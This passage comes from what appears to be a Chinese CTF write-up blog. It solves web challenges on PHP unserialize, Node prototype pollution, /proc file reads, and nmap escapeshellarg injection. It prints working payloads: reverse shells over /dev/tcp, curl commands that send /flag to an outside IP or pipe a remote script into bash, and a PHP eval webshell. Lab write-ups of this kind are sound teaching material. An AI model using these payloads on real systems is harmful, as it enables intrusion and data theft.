class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;process();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;write();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-keyword">$this</span>-&gt;read();<br>            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(strlen((<span class="hljs-keyword">string</span>)<span class="hljs-keyword">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = file_put_contents(<span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-keyword">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;output(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = file_get_contents(<span class="hljs-keyword">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-keyword">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;process();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(ord(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; ord(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(is_valid(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = unserialize(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><p>逻辑比较简单，分析一下就是用<code>op</code>的值控制是读还是写的操作，这里直接想到的是读flag.php，这里有两个点要绕过。第一个就是</p><p><code>is_valid</code>函数限制序列化<code>protected</code>时产生的0x00，还有一个是<code>__destruct() </code>函数判断<code>op===2</code>使op为1是写入操作，同时让content为空字符，这样就写了个寂寞。</p><h4 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h4><p>利用php&gt;7.1版本时对于<code>public</code> <code>protected</code>并不敏感，序列化时可直接用<code>public</code>，让<code>op</code>等于数字2，强弱类型比较不解释了。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span></span><br><span class="hljs-class"></span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;op = <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;filename = <span class="hljs-string">&quot;flag.php&quot;</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>    &#125;<br><br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> FileHandler();<br><span class="hljs-variable">$demo</span> = serialize(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$demo</span>;<br><span class="hljs-comment">#输出&lt;/code&gt;[Result]: &lt;br&gt;&lt;?php $flag=&#x27;flag&#123;ce554f72-394d-480a-94e4-f42e3362042b&#125;&#x27;;</span><br></code></pre></div></td></tr></table></figure><h4 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h4><p>将<code>protected</code>序列化出来的s变成S，ascii空字符改成十六进制\00即可</p><p>看了看wp，似乎buu这个环境和当时比赛时也不一样，当时还需要读路径，因为<code>apache</code>配置下destruct函数在执行时就不在本目录了，这个可以参考<a href="https://blog.csdn.net/fwkjdaghappy1/article/details/7631475%EF%BC%8C%E7%94%A8%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84%E5%AF%B9%E4%B8%8D%E5%87%BA%E6%9D%A5flag%EF%BC%8C%E6%83%B3%E8%A6%81%E8%8E%B7%E5%8F%96%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%EF%BC%8C%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E8%AF%BB%E5%8F%96%EF%BC%8C/proc/self/cmdline%EF%BC%8C%E7%84%B6%E5%90%8E%E5%8F%AF%E4%BB%A5%E7%9F%A5%E9%81%93%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84">https://blog.csdn.net/fwkjdaghappy1/article/details/7631475，用相对路径对不出来flag，想要获取绝对路径，可以通过读取，/proc/self/cmdline，然后可以知道配置文件路径</a> /web/config/httpd.conf。</p><h1 id="NOTES"><a href="#NOTES" class="headerlink" title="NOTES"></a>NOTES</h1><p>审计源码<code>edit_not</code>路由存在写入操作</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">app.route(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)<br>    .get(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>        res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);<br>    &#125;)<br>    .post(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>        <span class="hljs-keyword">let</span> id = req.body.id;<br>        <span class="hljs-keyword">let</span> author = req.body.author;<br>        <span class="hljs-keyword">let</span> enote = req.body.raw;<br>        <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;<br>            notes.edit_note(id, author, enote);<br>            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.render(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br></code></pre></div></td></tr></table></figure><p>写入操作用的是undersafe，存在原型链污染，再往下看发现执行命令的地方</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-title">edit_note</span>(<span class="hljs-params">id, author, raw</span>)</span> &#123;<br>        undefsafe(<span class="hljs-built_in">this</span>.note_list, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>        undefsafe(<span class="hljs-built_in">this</span>.note_list, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>    &#125;<br></code></pre></div></td></tr></table></figure><p>执行系统命令在输出，这里将污染commands字典来执行命令</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">app.route(<span class="hljs-string">&#x27;/status&#x27;</span>)<br>    .get(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>        <span class="hljs-keyword">let</span> commands = &#123;<br>            <span class="hljs-string">&quot;script-1&quot;</span>: <span class="hljs-string">&quot;uptime&quot;</span>,<br>            <span class="hljs-string">&quot;script-2&quot;</span>: <span class="hljs-string">&quot;free -m&quot;</span><br>        &#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> index <span class="hljs-keyword">in</span> commands) &#123;<br>            exec(commands[index], &#123;<span class="hljs-attr">shell</span>:<span class="hljs-string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="hljs-function">(<span class="hljs-params">err, stdout, stderr</span>) =&gt;</span> &#123;<br>                <span class="hljs-keyword">if</span> (err) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`stdout: <span class="hljs-subst">$&#123;stdout&#125;</span>`</span>);<br>            &#125;);<br>        &#125;<br>        res.send(<span class="hljs-string">&#x27;OK&#x27;</span>);<br>        res.end();<br>    &#125;)<br><br></code></pre></div></td></tr></table></figure><p>令command多了一个键值对 author:系统命令，遍历时自动执行<br>/edit_note post传参 id=<em>proto</em>.bb&amp;author=curl -F ‘flag=@/flag’ 174.1.84.222:2333&amp;raw=a<br>或者：id=_proto_，author=bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1，raw=123<br>id=<em>proto</em>.abc&amp;author=curl%20ip:port/shell.txt|bash&amp;raw=a<br>id=<em>proto</em>&amp;author=cat /flag&gt;/dev/tcp/xxxxx/7777&amp;raw=123</p><p>这里需要用buu小号重开一个Linux Labs反弹，因为buu只能反弹shell到内网。</p><h1 id="PicDown"><a href="#PicDown" class="headerlink" title="PicDown"></a>PicDown</h1><p>打开界面看了一下get参数有<code>url</code>简单试了下就出来了<code>../../../../../../../../../flag</code>。。肯定不是预期解，看一下预期解。</p><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>又考了下关于进程信息的东西。参考：<a href="https://blog.csdn.net/shenhuxi_yu/article/details/79697792">https://blog.csdn.net/shenhuxi_yu/article/details/79697792</a></p><p>在/proc 文件系统中，每一个进程都有一个相应的文件 。下面是/proc 目录下的一些重要文件 ：</p><p>/proc/pid/cmdline 包含了用于开始进程的命令 ；</p><p>/proc/pid/cwd 包含了当前进程工作目录的一个链接 ；</p><p>/proc/pid/environ 包含了可用进程环境变量的列表 ；</p><p>/proc/pid/exe 包含了正在进程中运行的程序链接；</p><p>/proc/pid/fd/ 这个目录包含了进程打开的每一个文件的链接；</p><p>/proc/pid/mem 包含了进程在内存中的内容；</p><p>/proc/pid/stat 包含了进程的状态信息；</p><p>/proc/pid/statm 包含了进程的内存使用信息。</p><p>PID一列代表了各进程的进程ID,也就是说,PID就是各进程的身份标识。<code>/proc/self</code>表示当前进程目录</p><p>这里用到了<code>/proc/self/cmdline</code>读取当前进程执行命令，用python2执行了app.py脚本，读取一下源码</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, Response<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> urllib<br><br>app = Flask(__name__)<br><br>SECRET_FILE = <span class="hljs-string">&quot;/tmp/secret.txt&quot;</span><br>f = <span class="hljs-built_in">open</span>(SECRET_FILE)<br>SECRET_KEY = f.read().strip()<br>os.remove(SECRET_FILE)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/page&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">page</span>():</span><br>    url = request.args.get(<span class="hljs-string">&quot;url&quot;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> url.lower().startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>            res = urllib.urlopen(url)<br>            value = res.read()<br>            response = Response(value, mimetype=<span class="hljs-string">&#x27;application/octet-stream&#x27;</span>)<br>            response.headers[<span class="hljs-string">&#x27;Content-Disposition&#x27;</span>] = <span class="hljs-string">&#x27;attachment; filename=beautiful.jpg&#x27;</span><br>            <span class="hljs-keyword">return</span> response<br>        <span class="hljs-keyword">else</span>:<br>            value = <span class="hljs-string">&quot;HACK ERROR!&quot;</span><br>    <span class="hljs-keyword">except</span>:<br>        value = <span class="hljs-string">&quot;SOMETHING WRONG!&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;search.html&#x27;</span>, res=value)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/no_one_know_the_manager&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">manager</span>():</span><br>    key = request.args.get(<span class="hljs-string">&quot;key&quot;</span>)<br>    <span class="hljs-built_in">print</span>(SECRET_KEY)<br>    <span class="hljs-keyword">if</span> key == SECRET_KEY:<br>        shell = request.args.get(<span class="hljs-string">&quot;shell&quot;</span>)<br>        os.system(shell)<br>        res = <span class="hljs-string">&quot;ok&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        res = <span class="hljs-string">&quot;Wrong Key!&quot;</span><br><br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8080</span>)<br></code></pre></div></td></tr></table></figure><p>只过滤了url参数开头不能用file协议，怪不得有非预期。在后面可以看到<code>no_one_know_the_manager</code>中要匹配SECRET_KEY，然后执行shell，但是SECRET_KEY所在的secret.txt被删掉了，这里就用到了<code>/proc/pid/fd/</code>读取，这个目录包含了进程打开的每一个文件的链接。爆破出secret在<code>/proc/pid/fd/3</code></p><p><img src="https://img-blog.csdnimg.cn/ea025726ab7b4d11aca95c2a4de1edc2.png" alt="在这里插入图片描述"></p><p>随后用shell参数反弹shell就行了。</p><h1 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h1><p>参考文章：<a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p><p><strong>escapeshellcmd</strong> — shell 元字符转义</p><p>功能：<code>escapeshellcmd()</code>对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <a href="http://php.net/manual/zh/function.exec.php">exec()</a> 或 <a href="http://php.net/manual/zh/function.system.php">system()</a> 函数，或者 <a href="http://php.net/manual/zh/language.operators.execution.php">执行操作符</a> 之前进行转义。</p><p>反斜线（\）会在以下字符之前插入： <code>&amp;#;|\*?~&lt;&gt;^()[]&#123;&#125;$, \x0A和 \xFF</code>。 *’* 和 <em>“</em> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <em>%</em> 和 <em>!</em> 字符都会被空格代替。</p><p><strong>定义</strong> ：<code>string escapeshellcmd ( string $command)</code></p><p><strong>escapeshellarg</strong> — 把字符串转码为可以在 shell 命令里使用的参数</p><p><strong>功能</strong> ：<code>escapeshellarg()</code> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)</p><p><strong>定义</strong> ：<code>string escapeshellarg ( string $arg )</code></p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>考察命令执行，和<code>escapeshellarg</code>的绕过</p><p>打开界面，发现是nmap，试一下127.0.0.1正常输出扫描结果，这肯定是命令执行，试一下<code>127.0.0.1| ls</code>,发现转义了|。</p><p><img src="https://img-blog.csdnimg.cn/0f98865e7a5849d8b9ae690eadcf69bf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>参考上面的文章绕过转义，这里有很多payload，注意php也被过滤了</p><p><code>&#39; &lt;?= @eval($_POST[&#39;cmd&#39;];)&gt; -oG pd.phtml &#39;</code></p><p><code>127.0.0.1&#39; -iL ../../../../flag -o 1</code></p><p>在线测试了一下，没问题</p><p><img src="https://img-blog.csdnimg.cn/56869b7313ac41da871dcdf5a862d9ab.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>可以看一下源码</p><p><img src="https://img-blog.csdnimg.cn/6f87e72fdd024af786d6e90606fd4eb7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>读flag</p><p><img src="https://img-blog.csdnimg.cn/8a52b789d1d74244ae930f7970c68d30.png" alt="在这里插入图片描述">****</p><h1 id="PHPWEB"><a href="#PHPWEB" class="headerlink" title="PHPWEB"></a>PHPWEB</h1><p>抓包发现有两个参数func和p,又提示有func最开始为date函数，猜测这里可以执行函数命令，试了一下system等发现被过滤，最后尝试了半天试了下<code>func=readfile&amp;p=./index.php</code>，读到了源码。</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<br> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>     <span class="hljs-variable">$result</span> = call_user_func(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>     <span class="hljs-variable">$a</span>= gettype(<span class="hljs-variable">$result</span>);<br>     <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>     &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<br> &#125;<br> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>     <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>     <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span 